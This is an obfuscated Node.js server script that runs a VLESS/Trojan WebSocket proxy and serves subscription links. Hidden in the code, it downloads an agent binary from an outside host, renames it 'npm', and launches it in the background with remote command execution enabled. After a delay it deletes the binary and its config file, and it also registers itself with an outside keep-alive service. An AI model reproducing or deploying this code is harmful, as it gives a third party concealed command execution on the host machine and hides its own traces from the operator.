const _0x47da8a=_0x485e;(function(_0x5559bf,_0x1bf7a5){const _0x14c70d=_0x485e,_0x330b58=_0x5559bf();while(!![]){try{const _0x2dbaf8=-parseInt(_0x14c70d(0xf6))/0x1+-parseInt(_0x14c70d(0xde))/0x2+parseInt(_0x14c70d(0xd2))/0x3*(-parseInt(_0x14c70d(0xb0))/0x4)+-parseInt(_0x14c70d(0xee))/0x5*(parseInt(_0x14c70d(0xb8))/0x6)+parseInt(_0x14c70d(0x11f))/0x7*(parseInt(_0x14c70d(0x11a))/0x8)+parseInt(_0x14c70d(0xe7))/0x9*(parseInt(_0x14c70d(0xba))/0xa)+-parseInt(_0x14c70d(0xa5))/0xb*(-parseInt(_0x14c70d(0xf8))/0xc);if(_0x2dbaf8===_0x1bf7a5)break;else _0x330b58['push'](_0x330b58['shift']());}catch(_0x674fba){_0x330b58['push'](_0x330b58['shift']());}}}(_0x4fc7,0x20634));const os=require('os'),http=require(_0x47da8a(0xd4)),fs=require('fs'),axios=require(_0x47da8a(0xf7)),net=require(_0x47da8a(0xb7)),path=require(_0x47da8a(0xf3)),crypto=require(_0x47da8a(0x124)),{Buffer}=require(_0x47da8a(0x103)),{exec,execSync}=require(_0x47da8a(0xae)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x47da8a(0xd7)]||_0x47da8a(0xd6),NEZHA_SERVER=process[_0x47da8a(0x10b)][_0x47da8a(0x108)]||'',NEZHA_PORT=process[_0x47da8a(0x10b)][_0x47da8a(0xc3)]||'',NEZHA_KEY=process[_0x47da8a(0x10b)][_0x47da8a(0x126)]||'',DOMAIN=process[_0x47da8a(0x10b)][_0x47da8a(0x123)]||_0x47da8a(0xd3),AUTO_ACCESS=process[_0x47da8a(0x10b)][_0x47da8a(0xb6)]||![],WSPATH=process[_0x47da8a(0x10b)][_0x47da8a(0xc2)]||UUID[_0x47da8a(0x10e)](0x0,0x8),SUB_PATH=process[_0x47da8a(0x10b)][_0x47da8a(0xe6)]||_0x47da8a(0x106),NAME=process[_0x47da8a(0x10b)]['NAME']||'',PORT=process[_0x47da8a(0x10b)][_0x47da8a(0x107)]||0xbb8;let ISP='';function _0x485e(_0x430630,_0x4ef2c9){_0x430630=_0x430630-0xa4;const _0x4fc754=_0x4fc7();let _0x485eef=_0x4fc754[_0x430630];return _0x485eef;}const GetISP=async()=>{const _0x3f843f=_0x47da8a;try{const _0x119c38=await axios['get'](_0x3f843f(0xac)),_0x3cb715=_0x119c38[_0x3f843f(0xc9)];ISP=(_0x3cb715[_0x3f843f(0xe8)]+'-'+_0x3cb715[_0x3f843f(0xbd)])[_0x3f843f(0xa4)](/ /g,'_');}catch(_0x25f691){ISP='Unknown';}};GetISP();const httpServer=http[_0x47da8a(0xfb)]((_0x21bc2e,_0x5c0f17)=>{const _0x4b3f04=_0x47da8a;if(_0x21bc2e['url']==='/'){const _0x4dcbcb=path[_0x4b3f04(0xf2)](__dirname,_0x4b3f04(0xaf));fs['readFile'](_0x4dcbcb,_0x4b3f04(0xc8),(_0x13a059,_0x3946aa)=>{const _0x57cfc4=_0x4b3f04;if(_0x13a059){_0x5c0f17[_0x57cfc4(0xc1)](0xc8,{'Content-Type':_0x57cfc4(0x104)}),_0x5c0f17['end'](_0x57cfc4(0xfe));return;}_0x5c0f17['writeHead'](0xc8,{'Content-Type':_0x57cfc4(0x104)}),_0x5c0f17['end'](_0x3946aa);});return;}else{if(_0x21bc2e['url']==='/'+SUB_PATH){const _0xfb7647=NAME?NAME+'-'+ISP:ISP,_0x3e8dfa=_0x4b3f04(0xd9)+UUID+_0x4b3f04(0xbe)+DOMAIN+_0x4b3f04(0x118)+DOMAIN+_0x4b3f04(0xad)+WSPATH+'#'+_0xfb7647,_0x39a2fd='trojan://'+UUID+_0x4b3f04(0xdd)+DOMAIN+_0x4b3f04(0x118)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0xfb7647,_0x57db50=_0x3e8dfa+'\x0a'+_0x39a2fd,_0x2f7151=Buffer[_0x4b3f04(0xaa)](_0x57db50)[_0x4b3f04(0x110)](_0x4b3f04(0x109));_0x5c0f17[_0x4b3f04(0xc1)](0xc8,{'Content-Type':_0x4b3f04(0xcf)}),_0x5c0f17['end'](_0x2f7151+'\x0a');}else _0x5c0f17[_0x4b3f04(0xc1)](0x194,{'Content-Type':_0x4b3f04(0xcf)}),_0x5c0f17['end']('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x47da8a(0xb2))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x47da8a(0x127),'1.1.1.1'];function resolveHost(_0x1cee88){return new Promise((_0x1bf9a0,_0xa984f)=>{const _0x4dd3b=_0x485e;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4dd3b(0xe0)](_0x1cee88)){_0x1bf9a0(_0x1cee88);return;}let _0x466512=0x0;function _0x400eed(){const _0x5354d5=_0x4dd3b;if(_0x466512>=DNS_SERVERS[_0x5354d5(0x112)]){_0xa984f(new Error(_0x5354d5(0xca)+_0x1cee88+_0x5354d5(0xc0)));return;}const _0x231f03=DNS_SERVERS[_0x466512];_0x466512++;const _0x33f718=_0x5354d5(0x11e)+encodeURIComponent(_0x1cee88)+_0x5354d5(0xd5);axios[_0x5354d5(0xa6)](_0x33f718,{'timeout':0x1388,'headers':{'Accept':_0x5354d5(0xea)}})[_0x5354d5(0xb4)](_0x2aee93=>{const _0x28da27=_0x5354d5,_0x43c343=_0x2aee93['data'];if(_0x43c343['Status']===0x0&&_0x43c343[_0x28da27(0xce)]&&_0x43c343[_0x28da27(0xce)][_0x28da27(0x112)]>0x0){const _0x5be469=_0x43c343[_0x28da27(0xce)]['find'](_0x3d9d50=>_0x3d9d50[_0x28da27(0x10a)]===0x1);if(_0x5be469){_0x1bf9a0(_0x5be469[_0x28da27(0xc9)]);return;}}_0x400eed();})[_0x5354d5(0xe9)](_0xcc4dba=>{_0x400eed();});}_0x400eed();});}function handleVlessConnection(_0x2c5900,_0xa328ac){const _0x549285=_0x47da8a,[_0x819277]=_0xa328ac,_0xb81c5f=_0xa328ac[_0x549285(0x10e)](0x1,0x11);if(!_0xb81c5f[_0x549285(0xb3)]((_0x3c7115,_0x43c69d)=>_0x3c7115==parseInt(uuid[_0x549285(0xcc)](_0x43c69d*0x2,0x2),0x10)))return![];let _0x3e53f1=_0xa328ac[_0x549285(0x10e)](0x11,0x12)[_0x549285(0x10d)]()+0x13;const _0x3ba23a=_0xa328ac[_0x549285(0x10e)](_0x3e53f1,_0x3e53f1+=0x2)['readUInt16BE'](0x0),_0x20ca9d=_0xa328ac['slice'](_0x3e53f1,_0x3e53f1+=0x1)[_0x549285(0x10d)](),_0x1c6260=_0x20ca9d==0x1?_0xa328ac[_0x549285(0x10e)](_0x3e53f1,_0x3e53f1+=0x4)[_0x549285(0xf2)]('.'):_0x20ca9d==0x2?new TextDecoder()['decode'](_0xa328ac[_0x549285(0x10e)](_0x3e53f1+0x1,_0x3e53f1+=0x1+_0xa328ac['slice'](_0x3e53f1,_0x3e53f1+0x1)[_0x549285(0x10d)]())):_0x20ca9d==0x3?_0xa328ac[_0x549285(0x10e)](_0x3e53f1,_0x3e53f1+=0x10)['reduce']((_0x1359b9,_0xc1af52,_0x5c66a8,_0x43080e)=>_0x5c66a8%0x2?_0x1359b9['concat'](_0x43080e[_0x549285(0x10e)](_0x5c66a8-0x1,_0x5c66a8+0x1)):_0x1359b9,[])[_0x549285(0xe1)](_0x4e3c74=>_0x4e3c74[_0x549285(0xeb)](0x0)[_0x549285(0x110)](0x10))[_0x549285(0xf2)](':'):'';_0x2c5900[_0x549285(0x111)](new Uint8Array([_0x819277,0x0]));const _0x59e63b=createWebSocketStream(_0x2c5900);return resolveHost(_0x1c6260)[_0x549285(0xb4)](_0x1e7b43=>{const _0x756583=_0x549285;net[_0x756583(0xf5)]({'host':_0x1e7b43,'port':_0x3ba23a},function(){const _0x34b49f=_0x756583;this['write'](_0xa328ac['slice'](_0x3e53f1)),_0x59e63b['on'](_0x34b49f(0xc7),()=>{})[_0x34b49f(0xe3)](this)['on'](_0x34b49f(0xc7),()=>{})[_0x34b49f(0xe3)](_0x59e63b);})['on'](_0x756583(0xc7),()=>{});})[_0x549285(0xe9)](_0x5e36fd=>{const _0x1936fa=_0x549285;net['connect']({'host':_0x1c6260,'port':_0x3ba23a},function(){const _0x102bfd=_0x485e;this[_0x102bfd(0x117)](_0xa328ac['slice'](_0x3e53f1)),_0x59e63b['on'](_0x102bfd(0xc7),()=>{})[_0x102bfd(0xe3)](this)['on'](_0x102bfd(0xc7),()=>{})[_0x102bfd(0xe3)](_0x59e63b);})['on'](_0x1936fa(0xc7),()=>{});}),!![];}function handleTrojanConnection(_0xe9a652,_0xa67742){const _0x132a57=_0x47da8a;try{if(_0xa67742[_0x132a57(0x112)]<0x3a)return![];const _0x618458=_0xa67742[_0x132a57(0x10e)](0x0,0x38)[_0x132a57(0x110)](),_0x394da1=[UUID];let _0x299d5a=null;for(const _0x171190 of _0x394da1){const _0x1b0139=crypto[_0x132a57(0x120)](_0x132a57(0xfc))['update'](_0x171190)[_0x132a57(0x11b)](_0x132a57(0xfd));if(_0x1b0139===_0x618458){_0x299d5a=_0x171190;break;}}if(!_0x299d5a)return![];let _0x526d6c=0x38;_0xa67742[_0x526d6c]===0xd&&_0xa67742[_0x526d6c+0x1]===0xa&&(_0x526d6c+=0x2);const _0x4d32e9=_0xa67742[_0x526d6c];if(_0x4d32e9!==0x1)return![];_0x526d6c+=0x1;const _0x160e0f=_0xa67742[_0x526d6c];_0x526d6c+=0x1;let _0x29edaa,_0x33607b;if(_0x160e0f===0x1)_0x29edaa=_0xa67742[_0x132a57(0x10e)](_0x526d6c,_0x526d6c+0x4)[_0x132a57(0xf2)]('.'),_0x526d6c+=0x4;else{if(_0x160e0f===0x3){const _0xaec068=_0xa67742[_0x526d6c];_0x526d6c+=0x1,_0x29edaa=_0xa67742[_0x132a57(0x10e)](_0x526d6c,_0x526d6c+_0xaec068)[_0x132a57(0x110)](),_0x526d6c+=_0xaec068;}else{if(_0x160e0f===0x4)_0x29edaa=_0xa67742[_0x132a57(0x10e)](_0x526d6c,_0x526d6c+0x10)[_0x132a57(0xef)]((_0x572176,_0x420e99,_0x546a53,_0x4877e9)=>_0x546a53%0x2?_0x572176[_0x132a57(0xbf)](_0x4877e9['slice'](_0x546a53-0x1,_0x546a53+0x1)):_0x572176,[])[_0x132a57(0xe1)](_0x413497=>_0x413497[_0x132a57(0xeb)](0x0)[_0x132a57(0x110)](0x10))[_0x132a57(0xf2)](':'),_0x526d6c+=0x10;else return![];}}_0x33607b=_0xa67742['readUInt16BE'](_0x526d6c),_0x526d6c+=0x2;_0x526d6c<_0xa67742[_0x132a57(0x112)]&&_0xa67742[_0x526d6c]===0xd&&_0xa67742[_0x526d6c+0x1]===0xa&&(_0x526d6c+=0x2);const _0x2781ee=createWebSocketStream(_0xe9a652);return resolveHost(_0x29edaa)[_0x132a57(0xb4)](_0x410b65=>{const _0xc62dd3=_0x132a57;net[_0xc62dd3(0xf5)]({'host':_0x410b65,'port':_0x33607b},function(){const _0x52b09d=_0xc62dd3;_0x526d6c<_0xa67742[_0x52b09d(0x112)]&&this['write'](_0xa67742[_0x52b09d(0x10e)](_0x526d6c)),_0x2781ee['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})[_0x52b09d(0xe3)](_0x2781ee);})['on'](_0xc62dd3(0xc7),()=>{});})[_0x132a57(0xe9)](_0x2363e1=>{const _0xc23358=_0x132a57;net[_0xc23358(0xf5)]({'host':_0x29edaa,'port':_0x33607b},function(){const _0xb60fb8=_0xc23358;_0x526d6c<_0xa67742[_0xb60fb8(0x112)]&&this[_0xb60fb8(0x117)](_0xa67742[_0xb60fb8(0x10e)](_0x526d6c)),_0x2781ee['on'](_0xb60fb8(0xc7),()=>{})[_0xb60fb8(0xe3)](this)['on'](_0xb60fb8(0xc7),()=>{})[_0xb60fb8(0xe3)](_0x2781ee);})['on']('error',()=>{});}),!![];}catch(_0x27bce7){return![];}}wss['on'](_0x47da8a(0x11d),(_0x179bbb,_0x36886b)=>{const _0x4eb61b=_0x47da8a,_0x193fae=_0x36886b[_0x4eb61b(0xdc)]||'';_0x179bbb['once'](_0x4eb61b(0xcb),_0x173489=>{const _0x2a2dae=_0x4eb61b;if(_0x173489[_0x2a2dae(0x112)]>0x11&&_0x173489[0x0]===0x0){const _0x889c32=_0x173489[_0x2a2dae(0x10e)](0x1,0x11),_0x62bf23=_0x889c32[_0x2a2dae(0xb3)]((_0x46a0bb,_0x1d4d6b)=>_0x46a0bb==parseInt(uuid[_0x2a2dae(0xcc)](_0x1d4d6b*0x2,0x2),0x10));if(_0x62bf23){!handleVlessConnection(_0x179bbb,_0x173489)&&_0x179bbb['close']();return;}}!handleTrojanConnection(_0x179bbb,_0x173489)&&_0x179bbb[_0x2a2dae(0xdf)]();})['on'](_0x4eb61b(0xc7),()=>{});});const getDownloadUrl=()=>{const _0x4d4560=_0x47da8a,_0x352dd0=os[_0x4d4560(0xc5)]();return _0x352dd0==='arm'||_0x352dd0===_0x4d4560(0x10f)||_0x352dd0===_0x4d4560(0xe2)?!NEZHA_PORT?_0x4d4560(0xd8):_0x4d4560(0x115):!NEZHA_PORT?_0x4d4560(0xb5):_0x4d4560(0x125);},downloadFile=async()=>{const _0x1742f5=_0x47da8a;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1fac9e=getDownloadUrl(),_0x181840=await axios({'method':_0x1742f5(0xa6),'url':_0x1fac9e,'responseType':_0x1742f5(0xab)}),_0x591ec3=fs['createWriteStream'](_0x1742f5(0xe5));return _0x181840[_0x1742f5(0xc9)][_0x1742f5(0xe3)](_0x591ec3),new Promise((_0x4a4a65,_0x2b986c)=>{const _0x560b2b=_0x1742f5;_0x591ec3['on'](_0x560b2b(0x121),()=>{const _0x348349=_0x560b2b;console[_0x348349(0xed)](_0x348349(0xe4)),exec('chmod\x20+x\x20npm',_0x5d66f9=>{if(_0x5d66f9)_0x2b986c(_0x5d66f9);_0x4a4a65();});}),_0x591ec3['on'](_0x560b2b(0xc7),_0x2b986c);});}catch(_0x244efa){throw _0x244efa;}},runnz=async()=>{const _0x5156da=_0x47da8a;try{const _0x3e417c=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x3e417c['trim']()!==''){console[_0x5156da(0xed)](_0x5156da(0x102));return;}}catch(_0xf7894b){}await downloadFile();let _0x247f37='',_0x180e16=[_0x5156da(0xff),_0x5156da(0xb1),'2096',_0x5156da(0xec),_0x5156da(0xc6),_0x5156da(0xb9)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4c92ec=_0x180e16[_0x5156da(0xa8)](NEZHA_PORT)?_0x5156da(0xcd):'';_0x247f37=_0x5156da(0xda)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5156da(0x101)+NEZHA_KEY+'\x20'+_0x4c92ec+_0x5156da(0xfa);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x25bc53=NEZHA_SERVER[_0x5156da(0xa8)](':')?NEZHA_SERVER[_0x5156da(0x114)](':')[_0x5156da(0xf0)]():'',_0x3059cb=_0x180e16[_0x5156da(0xa8)](_0x25bc53)?_0x5156da(0xa9):_0x5156da(0xa7),_0x4f1f38=_0x5156da(0x11c)+NEZHA_KEY+_0x5156da(0xbc)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x3059cb+_0x5156da(0x10c)+UUID;fs[_0x5156da(0xd1)](_0x5156da(0x105),_0x4f1f38);}_0x247f37=_0x5156da(0x122);}else{console[_0x5156da(0xed)](_0x5156da(0xd0));return;}}try{exec(_0x247f37,{'shell':_0x5156da(0x113)},_0x28935c=>{const _0x2a64c4=_0x5156da;if(_0x28935c)console['error'](_0x2a64c4(0xdb),_0x28935c);else console[_0x2a64c4(0xed)](_0x2a64c4(0xc4));});}catch(_0x5ee7d2){console['error'](_0x5156da(0x119)+_0x5ee7d2);}};function _0x4fc7(){const _0x1b6237=['npm','SUB_PATH','1179foufQy','country','catch','application/dns-json','readUInt16BE','2087','log','20015wSuMLY','reduce','pop','listen','join','path','application/json','connect','200964cndezn','axios','12GcWOhf','https://oooo.serv00.net/add-url','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','createServer','sha224','hex','Hello\x20world!','443','unlink','\x20-p\x20','npm\x20is\x20already\x20running,\x20skip\x20running...','buffer','text/html','config.yaml','sub','PORT','NEZHA_SERVER','base64','type','env','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','readUInt8','slice','arm64','toString','send','length','/bin/bash','split','https://arm64.ssss.nyc.mn/agent','Server\x20is\x20running\x20on\x20port\x20','write','&fp=chrome&type=ws&host=','error:\x20','472SwoVQY','digest','client_secret:\x20','connection','https://dns.google/resolve?name=','7805rrRwDq','createHash','finish','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','DOMAIN','crypto','https://amd64.ssss.nyc.mn/agent','NEZHA_KEY','8.8.4.4','replace','3109469afnUOH','get','false','includes','true','from','stream','https://speed.cloudflare.com/meta','&path=%2F','child_process','index.html','25660PUnnPv','8443','Server','every','then','https://amd64.ssss.nyc.mn/v1','AUTO_ACCESS','net','264wylRIz','2053','19970BLzSfd','https://','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','asOrganization','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','concat','\x20with\x20all\x20DNS\x20servers','writeHead','WSPATH','NEZHA_PORT','npm\x20is\x20running','arch','2083','error','utf8','data','Failed\x20to\x20resolve\x20','message','substr','--tls','Answer','text/plain','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','writeFileSync','3dylTlO','1234.abc.com','http','&type=A','2bb58e99-deff-4a81-a601-5101dce501e6','UUID','https://arm64.ssss.nyc.mn/v1','vless://','setsid\x20nohup\x20./npm\x20-s\x20','npm\x20running\x20error:','url','@cdns.doon.eu.org:443?security=tls&sni=','187800QyOxuc','close','test','map','aarch64','pipe','npm\x20download\x20successfully'];_0x4fc7=function(){return _0x1b6237;};return _0x4fc7();}async function addAccessTask(){const _0x3cd7ca=_0x47da8a;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x16147d=_0x3cd7ca(0xbb)+DOMAIN+'/'+SUB_PATH;try{const _0x5d0a88=await axios['post'](_0x3cd7ca(0xf9),{'url':_0x16147d},{'headers':{'Content-Type':_0x3cd7ca(0xf4)}});console[_0x3cd7ca(0xed)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x10d86b){}}const delFiles=()=>{const _0x39cd86=_0x47da8a;fs[_0x39cd86(0x100)](_0x39cd86(0xe5),()=>{}),fs['unlink'](_0x39cd86(0x105),()=>{});};httpServer[_0x47da8a(0xf1)](PORT,()=>{const _0x77ee2b=_0x47da8a;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x77ee2b(0x116)+PORT);});
